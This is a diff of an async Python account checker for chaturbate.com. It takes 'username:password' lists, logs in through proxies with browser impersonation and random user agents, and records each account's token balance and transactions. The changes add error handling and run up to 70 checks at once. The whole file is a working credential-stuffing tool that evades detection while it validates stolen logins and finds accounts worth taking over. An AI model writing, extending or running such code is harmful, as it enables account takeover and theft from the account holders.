@@ -88,7 +88,7 @@ async def send_message(task_id: str, message: str):
 
 @userRouter.post("/connect-websocket/")
 async def connect_websocket(task_id: str):
-    uri = f"wss://extended-candide-mypula-43126005.koyeb.app/ws/{task_id}"
+    uri = f"ws://localhost:8000/ws/{task_id}"
     async def websocket_client():
         async with websockets.connect(uri) as websocket:
             # await websocket.send("Hello Server!")
@@ -467,10 +467,13 @@ async def fetch_data_cookies(account, proxy):
 
         # print(response.text())
         proxies = { 
-            "socks5" : proxy, 
+            "https" : proxy, 
         }
-        response = await session.get("https://chaturbate.com/auth/login", impersonate="chrome110", proxies=proxies)
-        
+        try:
+            response = await session.get("https://chaturbate.com/auth/login", impersonate="chrome110", proxies=proxies)
+        except Exception as e:
+            print(e)
+            return
         # print(response.text)
         csrf_token = ''
         if response.status_code == 200:
@@ -495,9 +498,11 @@ async def fetch_data_cookies(account, proxy):
             'username': username,
             'password': password
         }
-
-        response = await session.post(url, headers=headers, data=data, impersonate="chrome110", proxies=proxies)
-
+        try:
+            response = await session.post(url, headers=headers, data=data, impersonate="chrome110", proxies=proxies)
+        except Exception as e:
+            print(e)
+            return
         print(response)
 
         if response.status_code == 200:
@@ -749,17 +754,21 @@ async def fetch_data_cookies_checker(account, proxy):
     async with AsyncSession() as session:
         ua = UserAgent()
         usAgent = ua.random
-        try:
-            username, password = account.split(':')
-        except Exception as e:
-            return
+        username, password = account.split(':')
+        # try:
+        # except Exception as e:
+        #     return
         # session = requests.Session()
 
         # print(response.text())
         proxies = { 
             "https" : proxy, 
         }
-        response = await session.get("https://chaturbate.com/auth/login", impersonate="chrome110", proxies=proxies)
+        try:
+            response = await session.get("https://chaturbate.com/auth/login", impersonate="chrome110", proxies=proxies)
+        except Exception as e:
+            return {"acc_login": username, "acc_password": password, "type": 'error', "token_balance": "0", "transaction": ""}
+        
         
         # print(response.text)
         csrf_token = ''
@@ -785,20 +794,27 @@ async def fetch_data_cookies_checker(account, proxy):
             'username': username,
             'password': password
         }
-
-        response = await session.post(url, headers=headers, data=data, impersonate="chrome110", proxies=proxies)
+        try:
+            response = await session.post(url, headers=headers, data=data, impersonate="chrome110", proxies=proxies)
+        except Exception as e:
+            return {"acc_login": username, "acc_password": password, "type": 'error', "token_balance": "0", "transaction": ""}
+        
 
         print(response)
         
         url = f'https://chaturbate.com/api/ts/tipping/token-stats/?room={username}&currentpage=&max_transaction_id=&cashpage=0'
-        response = await session.get(url, cookies=session.cookies, impersonate="chrome110", proxies=proxies)
-        data = []
-        print(response)
+        try:
+            response = await session.get(url, cookies=session.cookies, impersonate="chrome110", proxies=proxies)
+        except Exception as e:
+            return {"acc_login": username, "acc_password": password, "type": 'error', "token_balance": "0", "transaction": ""}
+        
         if response.status_code != 200:
             return {"acc_login": username, "acc_password": password, "type": 'error', "token_balance": "0", "transaction": ""}
         try:
-            if isinstance(response, list):
-                data = response.json()
+            data = response.json()
+            if isinstance(data, dict):
+                # print(data)
+                pass
             else:
                 return {"acc_login": username, "acc_password": password, "type": 'error', "token_balance": "0", "transaction": ""}
         except Exception as e:
@@ -807,9 +823,8 @@ async def fetch_data_cookies_checker(account, proxy):
         if not data:
             return {}
      
-     
+        # if isinstance(data, dict):
         if 'transactions' in data:
-            print('111')
             transactions = data['transactions']
             if transactions:
                 token_balance = data['token_balance']
@@ -822,7 +837,6 @@ async def fetch_data_cookies_checker(account, proxy):
                 else:
                     return {}
         else:
-            print('333')
             if 'periods' in data:
                 return {"acc_login": username, "acc_password": password, "type": 'empty', "transaction": ""}
             else:
@@ -836,9 +850,12 @@ async def fetch_data_cookies_checker(account, proxy):
         #     print(f"Error to login {username}: {response.status_code}")
 
 async def main_checker_func_second(accounts, proxies):
+    semaphore = asyncio.Semaphore(70)
     tasks = []
     for account, proxy in zip(accounts, proxies):
-        tasks.append(fetch_data_cookies_checker(account, proxy))
+        async with semaphore:
+            tasks.append(fetch_data_cookies_checker(account, proxy))
+        # await asyncio.sleep(1)
 
     results = await asyncio.gather(*tasks)
 
